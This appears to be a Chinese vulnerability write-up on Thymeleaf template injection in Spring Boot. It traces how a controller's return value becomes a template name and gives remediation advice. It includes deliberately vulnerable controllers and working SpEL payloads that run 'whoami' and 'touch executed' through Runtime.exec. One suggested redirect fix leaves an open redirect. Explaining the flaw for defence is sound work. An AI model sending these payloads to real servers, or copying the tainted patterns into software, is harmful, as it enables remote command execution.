<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs63189908{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:decimal;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="spring-boot-thymeleaf-模板注入"><span class="csDE05BCC">Spring Boot Thymeleaf </span><span class="csECDA2D3">模板注入</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Thymeleaf</span><span class="cs9C1B1871">是用于</span><span class="cs8926E06">Web</span><span class="cs9C1B1871">和独立环境的现代服务器端</span><span class="cs8926E06">Java</span><span class="cs9C1B1871">模板引擎。类似与</span><span class="cs8926E06">python web</span><span class="cs9C1B1871">开发中的</span><span class="cs8926E06">jinja</span><span class="cs9C1B1871">模板引擎。顺便说一句，</span><span class="cs8926E06">Thymeleaf</span><span class="cs9C1B1871">是</span><span class="cs8926E06">spring boot</span><span class="cs9C1B1871">的推荐引擎</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="X2da25b8c42db6a88aaabcb795045af29066d9e8"><span class="csD1E291E2">0x01 </span><span class="csD6CA00D2">基础知识</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">Spring Boot </span><span class="cs9C1B1871">本身就</span><span class="cs8926E06"> Spring MVC </span><span class="cs9C1B1871">的简化版本。是在</span><span class="cs8926E06"> Spring MVC </span><span class="cs9C1B1871">的基础上实现了自动配置，简化了开发人员开发过程。</span><span class="cs8926E06">Spring MVC </span><span class="cs9C1B1871">是通过一个叫</span><span class="cs8926E06"> DispatcherServlet </span><span class="cs9C1B1871">前端控制器的来拦截请求的。而在</span><span class="cs8926E06"> Spring Boot </span><span class="cs9C1B1871">中</span><span class="cs8926E06"> </span><span class="cs9C1B1871">使用自动配置把</span><span class="cs8926E06"> DispatcherServlet </span><span class="cs9C1B1871">前端控制器自动配置到框架中。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">例如，我们来解析</span><span class="cs8926E06"> /users </span><span class="cs9C1B1871">这个请求</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Boot/Spring%20Boot%20Thymeleaf%20%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5_files/image0.png" width="560" height="302" alt="" style="border-width:0px;" /></span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9FB05234">DispatcherServlet </span><span class="cs7FFD2630">前端控制器拦截请求</span><span class="cs9FB05234"> /users</span></li><li class="cs63189908"><span class="cs8926E06">servlet </span><span class="cs9C1B1871">决定使用哪个</span><span class="cs8926E06"> handler </span><span class="cs9C1B1871">处理</span></li><li class="cs63189908"><span class="cs8926E06">Spring </span><span class="cs9C1B1871">检测哪个控制器匹配</span><span class="cs8926E06"> /users</span><span class="cs9C1B1871">，</span><span class="cs8926E06">Spring </span><span class="cs9C1B1871">从</span><span class="cs8926E06"> @RquestMapping </span><span class="cs9C1B1871">中查找出需要的信息</span></li><li class="cs63189908"><span class="cs8926E06">Spring </span><span class="cs9C1B1871">找到正确的</span><span class="cs8926E06"> Controller </span><span class="cs9C1B1871">方法后，开始执行</span><span class="cs8926E06"> Controller </span><span class="cs9C1B1871">方法</span></li><li class="cs63189908"><span class="cs9C1B1871">返回</span><span class="cs8926E06"> users </span><span class="cs9C1B1871">对象列表</span></li><li class="cs63189908"><span class="cs9C1B1871">根据与客户端交互需要返回</span><span class="cs8926E06"> Json </span><span class="cs9C1B1871">或者</span><span class="cs8926E06"> Xml </span><span class="cs9C1B1871">格式</span></li></ol>
		<h3 class="cs868C439D">
			<a name="spring-boot-相关注解"><span class="csD1E291E2">spring boot </span><span class="csD6CA00D2">相关注解</span></a></h3>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">@Controller </span><span class="cs9C1B1871">处理</span><span class="cs8926E06"> Http </span><span class="cs9C1B1871">请求</span></li><li class="cs24C36B3"><span class="cs8926E06">@RestController @Controller </span><span class="cs9C1B1871">的衍生注解</span></li><li class="cs24C36B3"><span class="cs8926E06">@RequestMapping </span><span class="cs9C1B1871">路由请求</span><span class="cs8926E06"> </span><span class="cs9C1B1871">可以设置各种操作方法</span></li><li class="cs24C36B3"><span class="cs8926E06">@GetMapping GET </span><span class="cs9C1B1871">方法的路由</span></li><li class="cs24C36B3"><span class="cs8926E06">@PostMapping POST </span><span class="cs9C1B1871">方法的路由</span></li><li class="cs24C36B3"><span class="cs8926E06">@PutMapping PUT </span><span class="cs9C1B1871">方法的路由</span></li><li class="cs24C36B3"><span class="cs8926E06">@DeleteMapping DELETE </span><span class="cs9C1B1871">方法的路由</span></li><li class="cs24C36B3"><span class="cs8926E06">@PathVariable </span><span class="cs9C1B1871">处理请求</span><span class="cs8926E06"> url </span><span class="cs9C1B1871">路径中的参数</span><span class="cs8926E06"> /user/{id}</span></li><li class="cs24C36B3"><span class="cs8926E06">@RequestParam </span><span class="cs9C1B1871">处理问号后面的参数</span></li><li class="cs24C36B3"><span class="cs8926E06">@RequestBody </span><span class="cs9C1B1871">请求参数以</span><span class="cs8926E06">json</span><span class="cs9C1B1871">格式提交</span></li><li class="cs24C36B3"><span class="cs8926E06">@ResponseBody </span><span class="cs9C1B1871">返回</span><span class="cs8926E06"> json </span><span class="cs9C1B1871">格式</span></li></ul>
		<h3 class="cs868C439D">
			<a name="controller注解"><span class="csD1E291E2">Controller</span><span class="csD6CA00D2">注解</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">@Controller </span><span class="cs9C1B1871">一般应用在有返回界面的应用场景下</span><span class="cs8926E06">.</span><span class="cs9C1B1871">例如，管理后台使用了</span><span class="cs8926E06"> thymeleaf </span><span class="cs9C1B1871">作为模板开发，需要从后台直接返回</span><span class="cs8926E06"> Model </span><span class="cs9C1B1871">对象到前台，那么这时候就需要使用</span><span class="cs8926E06"> @Controller </span><span class="cs9C1B1871">来注解。</span></p><h3 class="cs868C439D">
			<a name="requestmapping注解"><span class="csD1E291E2">RequestMapping</span><span class="csD6CA00D2">注解</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">用来将一个</span><span class="cs8926E06">controller</span><span class="cs9C1B1871">添加至路由中</span></p><h2 class="cs868C439D">
			<a name="X575dd7fcf7103dd57790b2fd1654b65b1f01e03"><span class="csB2D98684">0x02 </span><span class="cs83F14626">环境配置</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://github.com/veracode-research/spring-view-manipulation/</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我们以</span><span class="cs8926E06">spring boot + Thymeleaf</span><span class="cs9C1B1871">模板创建一个带有漏洞的项目。核心代码如下</span></p><p class="cs3A447A38"><span class="cs9FB05234">&nbsp; &nbsp;&nbsp;@GetMapping(&quot;/path&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public String path(@RequestParam String lang) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return &nbsp;lang ; //template path is tainted</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">代码含义如下：用户请求的</span><span class="cs8926E06">url</span><span class="cs9C1B1871">为</span><span class="cs8926E06">path</span><span class="cs9C1B1871">，参数名称为</span><span class="cs8926E06">lang</span><span class="cs9C1B1871">，则服务器通过</span><span class="cs8926E06">Thymeleaf</span><span class="cs9C1B1871">模板，去查找相关的模板文件。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">例如，用户通过</span><span class="cs8926E06">get</span><span class="cs9C1B1871">请求</span><span class="cs9FB05234">/path?lang=en</span><span class="cs9C1B1871">，则服务器去自动拼接待查找的模板文件名，为</span><span class="cs9FB05234">resources/templates/en.html</span><span class="cs9C1B1871">，并返回给用户的浏览器。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">上面的代码存在两个问题：</span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9C1B1871">是不是存在任意文件读取？</span></li><li class="cs63189908"><span class="cs9C1B1871">是不是存在诸如模板注入的漏洞？？？</span></li></ol>
		<h2 class="cs868C439D">
			<a name="Xa3799d0aab0fc3ae33a21a57d0444fcd56c7f3b"><span class="csB2D98684">0x03 </span><span class="cs83F14626">模板注入分析</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">spring boot</span><span class="cs9C1B1871">如何查找</span><span class="cs8926E06">controller</span><span class="cs9C1B1871">这块我们不分析，因为对于我们不重要。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">spring boot</span><span class="cs9C1B1871">在</span><span class="cs9FB05234">org.springframework.web.servlet.ModelAndView</span><span class="cs9C1B1871">方法中，开始处理用户的请求</span></p><p class="cs3A447A38"><span class="cs9FB05234">&nbsp;/**</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;* This implementation expects the handler to be an {@link HandlerMethod}.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;*/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@Nullable</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public final ModelAndView handle(HttpServletRequest request, HttpServletResponse response, Object handler)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throws Exception {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return handleInternal(request, response, (HandlerMethod) handler);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">随后在</span><span class="cs9FB05234">org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod#invokeAndHandle</span><span class="cs9C1B1871">方法中，通过</span><span class="cs8926E06">invokeForRequest</span><span class="cs9C1B1871">函数，根据用户提供的</span><span class="cs8926E06">url</span><span class="cs9C1B1871">，调用相关的</span><span class="cs8926E06">controller</span><span class="cs9C1B1871">，并将其返回值，作为待查找的模板文件名，通过</span><span class="cs8926E06">Thymeleaf</span><span class="cs9C1B1871">模板引擎去查找，并返回给用户</span></p><p class="cs3A447A38"><span class="cs9FB05234">&nbsp;/**</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;* Invoke the method and handle the return value through one of the</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;* configured {@link HandlerMethodReturnValueHandler HandlerMethodReturnValueHandlers}.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;* @param webRequest the current request</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;* @param mavContainer the ModelAndViewContainer for this request</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;* @param providedArgs &quot;given&quot; arguments matched by type (not resolved)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;*/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public void invokeAndHandle(ServletWebRequest webRequest, ModelAndViewContainer mavContainer,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Object... providedArgs) throws Exception {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Object returnValue = invokeForRequest(webRequest, mavContainer, providedArgs);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setResponseStatus(webRequest);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (returnValue == null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (isRequestNotModified(webRequest) || getResponseStatus() != null || mavContainer.isRequestHandled()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;disableContentCachingIfNecessary(webRequest);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mavContainer.setRequestHandled(true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else if (StringUtils.hasText(getResponseStatusReason())) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mavContainer.setRequestHandled(true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mavContainer.setRequestHandled(false);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.returnValueHandlers.handleReturnValue(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;returnValue, getReturnValueType(returnValue), mavContainer, webRequest);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在函数中，调用</span><span class="cs9FB05234">this.returnValueHandlers.handleReturnValue</span><span class="cs9C1B1871">去处理返回结果。最终在</span><span class="cs9FB05234">org.springframework.web.servlet.mvc.method.annotation.ViewNameMethodReturnValueHandler#handleReturnValue</span><span class="cs9C1B1871">方法中，将</span><span class="cs8926E06">controller</span><span class="cs9C1B1871">返回值作为视图名称。代码如下</span></p><p class="cs3A447A38"><span class="cs9FB05234">&nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public void handleReturnValue(@Nullable Object returnValue, MethodParameter returnType,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ModelAndViewContainer mavContainer, NativeWebRequest webRequest) throws Exception {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (returnValue instanceof CharSequence) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String viewName = returnValue.toString();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mavContainer.setViewName(viewName);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (isRedirectViewName(viewName)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mavContainer.setRedirectModelScenario(true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">spring boot</span><span class="cs9C1B1871">最终在</span><span class="cs9FB05234">org.springframework.web.servlet.DispatcherServlet#processDispatchResult</span><span class="cs9C1B1871">方法中，调用</span><span class="cs8926E06">Thymeleaf</span><span class="cs9C1B1871">模板引擎的表达式解析。将上一步设置的视图名称为解析为模板名称，并加载模板，返回给用户。核心代码如下</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">org.thymeleaf.standard.expression.IStandardExpressionParser#parseExpression</span></p><p class="cs3A447A38"><span class="cs9FB05234">&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final String viewTemplateName = getTemplateName();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final ISpringTemplateEngine viewTemplateEngine = getTemplateEngine();</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final IStandardExpressionParser parser = StandardExpressions.getExpressionParser(configuration);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final FragmentExpression fragmentExpression;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// By parsing it as a standard expression, we might profit from the expression cache</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fragmentExpression = (FragmentExpression) parser.parseExpression(context, &quot;~{&quot; + viewTemplateName + &quot;}&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (final TemplateProcessingException e) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw new IllegalArgumentException(&quot;Invalid template name specification: &#39;&quot; + viewTemplateName + &quot;&#39;&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span></p><h2 class="cs868C439D">
			<a name="Xc5bb5a3c385895f6852ca7a2729a52e0de79900"><span class="csB2D98684">0x04 </span><span class="cs83F14626">不安全的</span><span class="csB2D98684">java</span><span class="cs83F14626">代码</span></a></h2>
		<h4 class="cs868C439D">
			<a name="第一种"><span class="cs6EDCDAE2">第一种：</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">&nbsp; &nbsp;&nbsp;@GetMapping(&quot;/path&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public String path(@RequestParam String lang) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return &nbsp;lang ; //template path is tainted</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在查找模板中，引用了用户输入的内容</span></p><p class="cs40DD2BC9"><span class="cs8926E06">payload</span></p><p class="cs3A447A38"><span class="cs9FB05234">GET /path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::.x HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org:8090</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span></p><p class="cs40DD2BC9"><span class="cs8926E06">2.png</span></p><h4 class="cs868C439D">
			<a name="第二种"><span class="cs6EDCDAE2">第二种</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">根据</span><span class="cs8926E06">spring boot</span><span class="cs9C1B1871">定义，如果</span><span class="cs8926E06">controller</span><span class="cs9C1B1871">无返回值，则以</span><span class="cs8926E06">GetMapping</span><span class="cs9C1B1871">的路由为视图名称。当然，对于每个</span><span class="cs8926E06">http</span><span class="cs9C1B1871">请求来讲，其实就是将请求的</span><span class="cs8926E06">url</span><span class="cs9C1B1871">作为视图名称，调用模板引擎去解析。</span></p><p class="cs6FD73CFB"><span class="cs8926E06">https://docs.spring.io/spring/docs/current/spring-framework-reference/web.html#mvc-ann-return-types</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在这种情况下，我们只要可以控制请求的</span><span class="cs8926E06">controller</span><span class="cs9C1B1871">的参数，一样可以造成</span><span class="cs8926E06">RCE</span><span class="cs9C1B1871">漏洞。例如我们可以控制</span><span class="cs8926E06">document</span><span class="cs9C1B1871">参数</span></p><p class="cs3A447A38"><span class="cs9FB05234">@GetMapping(&quot;/doc/{document}&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">public void getDocument(@PathVariable String document) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;log.info(&quot;Retrieving &quot; + document);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">GET /doc/__${T(java.lang.Runtime).getRuntime().exec(&quot;touch executed&quot;)}__::.x</span></p><h2 class="cs868C439D">
			<a name="Xf67ef4fb3c07a53c8aa2f7dba53faa13f168e5f"><span class="csB2D98684">0x05 </span><span class="cs83F14626">修复方案</span></a></h2>
		<h3 class="cs868C439D">
			<a name="Xdfcd703faaa67f006ebb92ef1c6782324eb5be4"><span class="csD1E291E2">1. </span><span class="csD6CA00D2">设置</span><span class="csD1E291E2">ResponseBody</span><span class="csD6CA00D2">注解</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">如果设置</span><span class="cs9FB05234">ResponseBody</span><span class="cs9C1B1871">，则不再调用模板解析</span></p><h3 class="cs868C439D">
			<a name="Xf813d64519f649f41796db4930cf9ad88b2c0a7"><span class="csD1E291E2">2. </span><span class="csD6CA00D2">设置</span><span class="csD1E291E2">redirect</span><span class="csD6CA00D2">重定向</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">@GetMapping(&quot;/safe/redirect&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">public String redirect(@RequestParam String url) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return &quot;redirect:&quot; + url; //CWE-601, as we can control the hostname in redirect</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">根据</span><span class="cs8926E06">spring boot</span><span class="cs9C1B1871">定义，如果名称以</span><span class="cs9FB05234">redirect:</span><span class="cs9C1B1871">开头，则不再调用</span><span class="cs9FB05234">ThymeleafView</span><span class="cs9C1B1871">解析，调用</span><span class="cs9FB05234">RedirectView</span><span class="cs9C1B1871">去解析</span><span class="cs9FB05234">controller</span><span class="cs9C1B1871">的返回值</span></p><h3 class="cs868C439D">
			<a name="X0529427d0ec015e5f12afc68d4973fce2cd4803"><span class="csD1E291E2">3. response</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">@GetMapping(&quot;/safe/doc/{document}&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">public void getDocument(@PathVariable String document, HttpServletResponse response) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;log.info(&quot;Retrieving &quot; + document); //FP</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">由于</span><span class="cs8926E06">controller</span><span class="cs9C1B1871">的参数被设置为</span><span class="cs8926E06">HttpServletResponse</span><span class="cs9C1B1871">，</span><span class="cs8926E06">Spring</span><span class="cs9C1B1871">认为它已经处理了</span><span class="cs8926E06">HTTP Response</span><span class="cs9C1B1871">，因此不会发生视图名称解析</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://www.cnblogs.com/potatsoSec/p/13620019.html</span></p></body>
</html>
